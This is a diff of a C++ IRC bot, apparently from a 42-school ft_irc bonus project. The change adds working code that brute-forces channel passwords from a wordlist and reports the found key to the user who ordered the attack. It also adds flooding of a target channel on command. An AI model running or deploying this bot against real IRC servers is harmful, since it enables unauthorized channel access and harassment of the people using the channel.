@@ -6,13 +6,14 @@
 /*   By: tilmanfs <tilmanfs@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/11/21 19:32:00 by tilmanfs          #+#    #+#             */
-/*   Updated: 2023/11/22 13:28:11 by tilmanfs         ###   ########.fr       */
+/*   Updated: 2023/11/22 16:18:52 by tilmanfs         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "Bot.hpp"
 #include <iostream>
 #include <cstring>
+#include <string>
 #include <unistd.h>
 #include <arpa/inet.h>
 
@@ -21,6 +22,7 @@ Bot         *Bot::instance  = NULL;
 std::string Bot::server     = "";
 int         Bot::port       = 0;
 std::string Bot::password   = "";
+std::string Bot::nick       = "";
 
 Bot::Bot()
 {
@@ -42,9 +44,11 @@ Bot::Bot()
     fds[0].fd = socket;
     fds[0].events = POLLIN | POLLOUT | POLLERR;
     // initialize variables
-    // running = true;
     registered = false;
     sent_register = false;
+    bruteforcing = false;
+    waiting_for_response = false;
+    flooding = false;
     // initialize the singleton instance
     Bot::instance = this;
 }
@@ -54,13 +58,17 @@ Bot::~Bot()
     std::cout << "Bot destroyed" << std::endl;
     // close socket
     close(socket);
+    // close wordlist if open
+    if (wordlist.is_open())
+        wordlist.close();
 }
 
-void    Bot::setup(const char* server, const char* port, const char* password)
+void    Bot::setup(const char* server, const char* port, const char* password, const char* nickname)
 {
     Bot::server = server;
     Bot::port = atoi(port);
     Bot::password = password;
+    Bot::nick = nickname;
 }
 
 Bot     &Bot::getInstance()
@@ -111,7 +119,7 @@ void    Bot::run()
         }
         if (fds[0].revents & POLLERR)
             throw std::runtime_error("POLLERR");
-        processMessages();
+        work();
     }
 }
 std::string Bot::generateRandomMessage()
@@ -123,7 +131,7 @@ std::string Bot::generateRandomMessage()
     return message;
 }
 
-void    Bot::processMessages()
+void   Bot::runAttacks()
 {
     // Flood channel
     if (flooding == true)
@@ -134,35 +142,81 @@ void    Bot::processMessages()
     // Bruteforce channel
     else if (bruteforcing == true && waiting_for_response == false)
     {
-        out_messages.push(Message::fromString("JOIN " + victim)); // ADD PASSWORDS HERE !!!!
-        waiting_for_response = true;
+        if (!wordlist.is_open())
+        {
+            bruteforcing = false;
+            out_messages.push(Message::fromString("PRIVMSG " + customer + " :Couldn't find my wordlist..."));
+        }
+        else
+        {
+            if (getline(wordlist, word))
+            {
+                if (!word.empty())
+                {
+                    waiting_for_response = true;
+                    out_messages.push(Message::fromString("JOIN " + victim + " " + word));
+                }
+            }
+            else
+            {
+                bruteforcing = false;
+                out_messages.push(Message::fromString("PRIVMSG " + customer + " :I tried all the passwords in my wordlist, but none of them worked..."));
+                wordlist.close();
+            }
+                
+            
+        }
     }
+}
+
+void    Bot::work()
+{
+    runAttacks();
+    // check for incoming messages
     while (in_buffer.find(END_OF_MESSAGE) != std::string::npos)
     {
         std::string msg_str = in_buffer.substr(0, in_buffer.find(END_OF_MESSAGE));
         in_buffer.erase(0, in_buffer.find(END_OF_MESSAGE) + strlen(END_OF_MESSAGE)); // IMMER ???
         Message msg = Message::fromString(msg_str);
         // std::cout << "\033[0;32mReceived:\033[0m\t" << msg_str;
-        
         if (registered == true)
         {
+            // check for messages while bruteforcing
             if (bruteforcing == true)
             {
-                if (msg.getCommand() == "PRIVMSG")
+                std::string cmmnd = msg.getCommand();
+                if (cmmnd == "PRIVMSG")
                     out_messages.push(Message::fromString("PRIVMSG " + msg.getPrefix().substr(0, msg.getPrefix().find("!")) + " :Busy taking over the world. Brb."));
-                if (msg.getCommand() == "JOIN")
+                // check if attack was successful
+                if (cmmnd == "JOIN")
                 {
                     std::string channel = msg.getParams()[0];
                     // std::string sender = msg.getPrefix().substr(0, msg.getPrefix().find("!"));
                     if (channel == victim)
                     {
-                        out_messages.push(Message::fromString("PRIVMSG " + customer + " :I'm done brute forcing the channel."));
+                        out_messages.push(Message::fromString("PRIVMSG " + customer + " :I'm done brute forcing and joining the channel " + victim + ". The password is: " + word + ". If you want I can flood the channel now."));
                         // leave channel
-                        out_messages.push(Message::fromString("PART " + victim));
+                        // out_messages.push(Message::fromString("PART " + victim));
                         bruteforcing = false;
+                        waiting_for_response = false;
+                        wordlist.close();
                     }
                 }
+                // check for wrong key response
+                else if (cmmnd == "475" || cmmnd == "479")
+                {
+                    waiting_for_response = false;
+                }
+                // check for errors
+                else if (cmmnd == "432" || cmmnd == "433" || cmmnd == "476" || cmmnd == "473" || cmmnd == "471" || cmmnd == "480")
+                {
+                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :I got an error while trying to brute force the channel: " + msg.getTrailing()));
+                    bruteforcing = false;
+                    waiting_for_response = false;
+                    wordlist.close();
+                }
             }
+            // check for messages while flooding
             else if (flooding == true)
             {
                 std::string sender = msg.getPrefix().substr(0, msg.getPrefix().find("!"));
@@ -170,6 +224,11 @@ void    Bot::processMessages()
                 if (msg.getCommand() == "401")
                 {
                     out_messages.push(Message::fromString("PRIVMSG " + customer + " :arrrgh, the victim doesn't exists... ?"));
+                    flooding = false;
+                }
+                else if (msg.getCommand() == "442")
+                {
+                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :I am not a member of the victim channel... so please let me first bruteforce the channel. After bruteforcing I will join the channel."));
                     flooding = false;
                 }
                 // message from customer (stop flooding)
@@ -182,8 +241,7 @@ void    Bot::processMessages()
                 else if (msg.getCommand() == "PRIVMSG")
                     out_messages.push(Message::fromString("PRIVMSG " + sender + " :I'm busy... leave me alone."));
             }
-            
-            // check for messages from users
+            // check for new commands to execute
             else if (msg.getCommand() == "PRIVMSG")
             {
                 std::string message = msg.getTrailing();
@@ -205,6 +263,7 @@ void    Bot::processMessages()
                     {
                         std::string channel = params[1];
                         out_messages.push(Message::fromString("PRIVMSG " + sender + " :Alright, got it. I'll get started on the brute forcing. Don't mind me, just a simple hackerbot doing my thing. I'll let you know when I'm done, but don't bother me until then, I've got work to do. See you in a bit, or not, depending on how long it takes me to take over the world."));
+                        wordlist.open("bonus/wordlist.txt");
                         bruteforcing = true;
                         customer = sender;
                         victim = channel;
@@ -240,35 +299,25 @@ void    Bot::processMessages()
         }
         else
         {
+            // check if registering was successful
             if (msg.getCommand() == "001") // RPL_WELCOME
             {
                 registered = true;
                 std::cout << "Registered to server" << std::endl;
             }
-            // else if (msg.getCommand() == "JOIN")
-            // {
-            //     std::cout << "joined " << msg.getParams()[0] << std::endl;
-            //     joined = true;
-            // }
-            // else if (msg.getCommand() == "432") // ERR_ERRONEUSNICKNAME
-            //     throw std::runtime_error("Erroneus nickname");
-            // else if (msg.getCommand() == "433") // ERR_NICKNAMEINUSE
-            //     throw std::runtime_error("Nickname already in use");
-            // else if (msg.getCommand() == "475") // ERR_BADCHANNELKEY
-            //     throw std::runtime_error("Bad channel key");
-            // else if (msg.getCommand() == "476") // ERR_BADCHANMASK
-            //     throw std::runtime_error("Bad channel mask");
-            // else if (msg.getCommand() == "473") // ERR_INVITEONLYCHAN
-            //     throw std::runtime_error("Invite only channel");
-            // else if (msg.getCommand() == "471") // ERR_CHANNELISFULL
-            //     throw std::runtime_error("Channel is full");
+            // check if registering failed
+            else
+            {
+                std::string cmmnd = msg.getCommand();
+                if (cmmnd == "432" || cmmnd == "433")
+                    throw std::runtime_error(msg.getTrailing());
+            }
         }
-
-
     }
+    // register to server
     if (sent_register == false && registered == false)
     {
-        out_messages.push(Message::fromString("NICK Hackerbot"));
+        out_messages.push(Message::fromString("NICK " + nick));
         out_messages.push(Message::fromString("USER " + std::string("anonym") + " B * :" + std::string("...")));
         sent_register = true;
     }
